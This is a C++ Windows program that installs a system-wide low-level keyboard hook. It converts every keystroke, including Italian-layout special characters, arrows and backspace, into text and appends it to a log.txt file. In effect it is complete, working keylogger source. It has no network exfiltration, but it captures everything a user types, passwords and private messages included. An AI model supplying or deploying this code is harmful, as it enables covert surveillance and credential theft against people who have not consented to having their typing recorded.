#include <Windows.h>
#include <iostream>
#include <string>
#include <fstream>

#pragma comment(lib, "user32.lib") // user32.dll windows' library

#define VK_0	0x30	// 48 - '0'
#define VK_1	0x31	// 49 - '1'
#define VK_2	0x32	// 50 - '2'
#define VK_3	0x33	// 51 - '3'
#define VK_4	0x34	// 52 - '4'
#define VK_5	0x35	// 53 - '5'
#define VK_6	0x36	// 54 - '6'
#define VK_7	0x37	// 55 - '7'
#define VK_8	0x38	// 56 - '8'
#define VK_9	0x39	// 57 - '9'

#define VK_A	0x41	// 65 - 'A'
#define VK_B	0x42	// 66 - 'B'
#define VK_C	0x43	// 67 - 'C'
#define VK_D	0x44	// 68 - 'D'
#define VK_E	0x45	// 69 - 'E'
#define VK_F	0x46	// 70 - 'F'
#define VK_G	0x47	// 71 - 'G'
#define VK_H	0x48	// 72 - 'H'
#define VK_I	0x49	// 73 - 'I'
#define VK_J	0x4A	// 74 - 'J'
#define VK_K	0x4B	// 75 - 'K'
#define VK_L	0x4C	// 76 - 'L'
#define VK_M	0x4D	// 77 - 'M'
#define VK_N	0x4E	// 78 - 'N'
#define VK_O	0x4F	// 79 - 'O'
#define VK_P	0x50	// 80 - 'P'
#define VK_Q	0x51	// 81 - 'Q'
#define VK_R	0x52	// 82 - 'R'
#define VK_S	0x53	// 83 - 'S'
#define VK_T	0x54	// 84 - 'T'
#define VK_U	0x55	// 85 - 'U'
#define VK_V	0x56	// 86 - 'V'
#define VK_W	0x57	// 87 - 'W'
#define VK_X	0x58	// 88 - 'X'
#define VK_Y	0x59	// 89 - 'Y'
#define VK_Z	0x5A	// 90 - 'Z'

// redefine some keys for the Italian keyboard
// SC stay for "Special Characters" with accent
#define VK_SC_E				VK_OEM_1		// èé[{
#define VK_SC_O				VK_OEM_3		// òç@
#define VK_SC_A				VK_OEM_7		// à°#
#define VK_SC_U				VK_OEM_2		// ù§
#define VK_SC_I				VK_OEM_6		// ì^
#define VK_BACKSLASH		VK_OEM_5		// \|
#define VK_APOSTROPHE		VK_OEM_4		// '?

HHOOK g_hook;

// Keyboard hook
static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
	{
		KBDLLHOOKSTRUCT* pKeyboardStruct = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);

		bool isShiftPressed = ((GetKeyState(VK_LSHIFT) & 0x8000) != 0) || ((GetKeyState(VK_RSHIFT) & 0x8000) != 0);
		bool isCapsLockActive = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
		bool isCtrlPressed = ((GetKeyState(VK_LCONTROL) & 0x8000) != 0) || ((GetKeyState(VK_RCONTROL) & 0x8000) != 0);
		bool isNumLockActive = ((GetKeyState(VK_NUMLOCK) & 1) != 0);
		bool isAltPressed = ((GetKeyState(VK_LMENU) & 0x8000) != 0);
		bool isAltGrPressed = ((GetKeyState(VK_LCONTROL) & 0x8000) != 0 && (GetKeyState(VK_RMENU) & 0x8000) != 0);

		int vkCode = pKeyboardStruct->vkCode;
		std::string message("");

		// checking TAB and SPACE
		if (!isShiftPressed && !(isCapsLockActive) && (vkCode == VK_SPACE || vkCode == VK_TAB) && !isCtrlPressed)
		{
			if (vkCode == VK_TAB) message = "|TAB|";
			else if (vkCode == VK_SPACE) message = " ";
		}
		// checking lowercase letters
		else if (!isShiftPressed && !isAltGrPressed && (vkCode >= VK_A && vkCode <= VK_Z) && !isCtrlPressed)
		{
			message = std::tolower(vkCode);
		}
		// checking capital letters
		else if ((isShiftPressed || isCapsLockActive) && !(pKeyboardStruct->flags & LLKHF_UP) && (vkCode >= VK_A && vkCode <= VK_Z))
		{
			message = std::toupper(vkCode);
		}
		// checking the numbers (and the numbers of the numeric keypad)
		else if (((vkCode >= VK_0 && vkCode <= VK_9) || isNumLockActive && (vkCode >= VK_NUMPAD0 && vkCode <= VK_NUMPAD9)) && !isShiftPressed)
		{
			// controllo singolarmente i numeri del tastierino numerico (a destra della tastiera)
			switch (vkCode)
			{
			case VK_NUMPAD0: // 0
				message = "0";
				break;
			case VK_NUMPAD1: // 1
				message = "1";
				break;
			case VK_NUMPAD2: // 2
				message = "2";
				break;
			case VK_NUMPAD3: // 3
				message = "3";
				break;
			case VK_NUMPAD4: // 4
				message = "4";
				break;
			case VK_NUMPAD5: // 5
				message = "5";
				break;
			case VK_NUMPAD6: // 6
				message = "6";
				break;
			case VK_NUMPAD7: // 7
				message = "7";
				break;
			case VK_NUMPAD8: // 8
				message = "8";
				break;
			case VK_NUMPAD9: // 9
				message = "9";
				break;
			default: // tutti i numeri sopra le lettere
				message = vkCode;
				break;
			}
		}
		// special characters with ALTRGR
		else if (!isShiftPressed && isAltGrPressed && (vkCode == VK_SC_E || vkCode == VK_OEM_PLUS || vkCode == VK_SC_O || vkCode == VK_SC_A))
		{
			switch (vkCode)
			{
			case VK_SC_E: // [
				message = "[";
				break;
			case VK_OEM_PLUS: // ]
				message = "]";
				break;
			case VK_SC_O: // @
				message = "@";
				break;
			case VK_SC_A: // #
				message = "#";
				break;
			}
		}
		// curly brackets
		else if (isShiftPressed && isAltGrPressed && (vkCode == VK_SC_E || vkCode == VK_OEM_PLUS))
		{
			if (vkCode == VK_SC_E) message = "{"; // {
			else if (vkCode == VK_OEM_PLUS) message = "}"; // }
		}
		// checking special characters
		else if (isShiftPressed && ((vkCode >= VK_SC_E && vkCode <= VK_SC_O) || (vkCode >= VK_APOSTROPHE && vkCode <= VK_SC_A) || (vkCode >= VK_0 && vkCode <= VK_9)))
		{
			// controllo tutti i caratteri speciali "scrivibili" con SHIFT
			switch (vkCode)
			{
			case VK_0: // =
				message = "=";
				break;
			case VK_1: // !
				message = "!";
				break;
			case VK_2: // "
				message = "\"";
				break;
			case VK_3: // £
				message = "£";
				break;
			case VK_4: // $
				message = "$";
				break;
			case VK_5: // %
				message = "%";
				break;
			case VK_6: // &
				message = "&";
				break;
			case VK_7: // '/'
				message = "/";
				break;
			case VK_8: // (
				message = "(";
				break;
			case VK_9: // )
				message = ")";
				break;
			case VK_SC_E: // é
				message = "é";
				break;
			case VK_OEM_PLUS: // 'SHIFT' + '+' = '*'
				message = "*";
				break;
			case VK_OEM_COMMA: // ;
				message = ";";
				break;
			case VK_OEM_MINUS: // _
				message = "_";
				break;
			case VK_OEM_PERIOD: // :
				message = ":";
				break;
			case VK_SC_U: // §
				message = "§";
				break;
			case VK_SC_O: // ç
				message = "ç";
				break;
			case VK_APOSTROPHE: // ?
				message = "?";
				break;
			case VK_BACKSLASH: // |
				message = "|";
				break;
			case VK_SC_I: // ^
				message = "^";
				break;
			case VK_SC_A: // °
				message = "°";
				break;
			}
		}
		// some keys WITHOUT pressing SHIFT
		else if (!isShiftPressed && ((vkCode >= VK_SC_E && vkCode <= VK_SC_O) || (vkCode >= VK_APOSTROPHE && vkCode <= VK_SC_A)))
		{
			switch (vkCode)
			{
			case VK_SC_E: // è
				message = "è";
				break;
			case VK_OEM_PLUS: // +
				message = "+";
				break;
			case VK_OEM_COMMA: // ,
				message = ",";
				break;
			case VK_OEM_MINUS: // -
				message = "-";
				break;
			case VK_OEM_PERIOD: // .
				message = ".";
				break;
			case VK_SC_U: // ù
				message = "ù";
				break;
			case VK_SC_O: // ò
				message = "ò";
				break;
			case VK_APOSTROPHE: // '
				message = "'";
				break;
			case VK_BACKSLASH: // '\'
				message = "\\";
				break;
			case VK_SC_I: // ì
				message = "ì";
				break;
			case VK_SC_A: // à
				message = "à";
				break;
			}
		}
		// ARROWS (UP, DOWN, LEFT, RIGHT)
		else if (!isShiftPressed && !isAltGrPressed && (vkCode >= VK_LEFT && vkCode <= VK_DOWN))
		{
			switch (vkCode)
			{
			case VK_LEFT: // LEFT
				message = "L|";
				break;
			case VK_UP: // UP
				message = "U|";
				break;
			case VK_RIGHT: // RIGHT
				message = "R|";
				break;
			case VK_DOWN: // DOWN
				message = "D|";
				break;
			}
			if (isCtrlPressed)
				message = "|CTRL->" + message;
			else
				message = "|->" + message;
		}
		// BACKSPACE
		else if (!isShiftPressed && !isAltGrPressed && vkCode == VK_BACK)
		{
			if (isCtrlPressed)
				message = "|CTRL<|";
			else
				message = "|<|";
		}
		// CANC / DELETE
		else if (!isShiftPressed && !isAltGrPressed && vkCode == VK_DELETE)
		{
			if (isCtrlPressed)
				message = "|CTRL>|";
			else
				message = "|>|";
		}
		// checking numPad operators
		else if (vkCode == VK_MULTIPLY || vkCode == VK_ADD || vkCode == VK_SUBTRACT || vkCode == VK_DECIMAL || vkCode == VK_DIVIDE)
		{
			switch (vkCode)
			{
			case VK_MULTIPLY: // *
				message = "*";
				break;
			case VK_ADD: // +
				message = "+";
				break;
			case VK_SUBTRACT: // -
				message = "-";
				break;
			case VK_DECIMAL: // .
				message = ".";
				break;
			case VK_DIVIDE: // '/'
				message = "/";
				break;
			}
		}
		// BLOCK NUM
		else if (vkCode == VK_NUMLOCK)
		{
			if (isNumLockActive)
				message = "\n|LOCKNUM_OFF|\n";
			else
				message = "\n|LOCKNUM_ON|\n";
		}
		// ENTER
		else if (vkCode == VK_RETURN)
		{
			message = "\n";
		}

		if (vkCode == VK_ESCAPE			// ESC
			|| vkCode == VK_F1			// F1
			|| vkCode == VK_F2			// F2
			|| vkCode == VK_F3			// F3
			|| vkCode == VK_F4			// F4
			|| vkCode == VK_F5			// F5
			|| vkCode == VK_F6			// F6
			|| vkCode == VK_F7			// F7
			|| vkCode == VK_F8			// F8
			|| vkCode == VK_F9			// F9
			|| vkCode == VK_F10			// F10
			|| vkCode == VK_F11			// F11
			|| vkCode == VK_F12			// F12
			|| vkCode == VK_CAPITAL		// CAPS LOCK
			|| vkCode == VK_LSHIFT		// LSHIFT
			|| vkCode == VK_RSHIFT		// RSHIFT
			|| vkCode == VK_LCONTROL	// LCTRL
			|| vkCode == VK_RCONTROL	// RCTRL
			|| vkCode == VK_LMENU		// LWIN
			|| vkCode == VK_RMENU		// RWIN
			|| vkCode == VK_APPS		// MENU (BOTTOM RIGHT)
			|| vkCode == VK_LMENU		// ALT
			|| vkCode == VK_RMENU		// ALTGR (162 + 165)
			|| vkCode == VK_SNAPSHOT	// STAMP/R SIST (PRINT)
			|| vkCode == VK_SCROLL		// BLOCC SCORR
			|| vkCode == VK_PAUSE		// PAUSA/INTERR
			|| vkCode == VK_PRIOR		// PAG UP
			|| vkCode == VK_NEXT		// PAG DOWN
			|| vkCode == VK_END			// END
			|| vkCode == VK_HOME		// HOME
			|| vkCode == VK_INSERT		// INS
			|| vkCode == VK_CLEAR		// NUMBER FIVE OF NUMERIC KEYPAD WHEN "NUM_LOCK" IS DISABLED
			) return CallNextHookEx(g_hook, nCode, wParam, lParam);

		// scrivo il messaggio sul file
		std::ofstream file("log.txt", std::ios::app);
		file << message;
		file.close();

	}
	// return control to the Operating System
	return CallNextHookEx(g_hook, nCode, wParam, lParam);
}

// main function
int main()
{
	HINSTANCE hInstance = GetModuleHandle(nullptr);
	g_hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, hInstance, 0);

	if (g_hook == nullptr) return EXIT_FAILURE;

	MSG msg;
	while (GetMessage(&msg, nullptr, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	UnhookWindowsHookEx(g_hook);

	return ERROR_SUCCESS;
}
